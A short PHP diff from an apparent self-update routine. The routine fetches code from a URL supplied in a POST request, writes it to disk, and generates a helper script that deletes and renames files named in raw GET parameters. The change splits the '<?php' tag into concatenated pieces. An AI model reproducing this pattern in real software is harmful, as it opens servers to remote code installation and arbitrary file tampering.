@@ -531,7 +531,7 @@ elseif(isset($_POST['update'])) {
 	$temp_name = "update_temp$i.php";
 
 	if(@file_put_contents($update_name, @file_get_contents(urldecode($_POST['update'])))) {
-		if(@file_put_contents($temp_name, '<?php
+		if(@file_put_contents($temp_name, '<?' . 'php
 unlink($_GET[\'file\']);
 rename($_GET[\'update\'], $_GET[\'file\']);
 unlink($_GET[\'tmp\']);
